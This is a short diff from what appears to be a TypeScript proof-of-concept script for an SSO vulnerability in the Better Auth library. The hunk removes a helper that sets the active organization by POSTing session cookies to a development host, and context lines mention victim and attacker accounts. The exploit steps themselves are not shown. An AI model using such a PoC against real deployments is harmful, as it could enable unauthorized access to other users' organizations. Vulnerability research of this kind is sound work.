@@ -174,23 +174,6 @@ const listMembers = async (cookies: string, organizationId: string) => {
     throw new Error("Failed to list members")
 }
 
-const setActiveOrganization = async (cookies: string, organizationId: string) => {
-    const response = await fetch("https://dev.untraceable.dev/api/auth/organization/set-active", {
-        body: JSON.stringify({ organizationId }),
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Cookie": cookies,
-        }
-    })
-    
-    if (response.ok) {
-        return await response.json()
-    }
-    
-    throw new Error("Failed to set active org")
-}
-
 console.log("=== Better Auth SSO Vulnerability PoC ===\n")
 
 // Step 1: Setup victim and attacker accounts
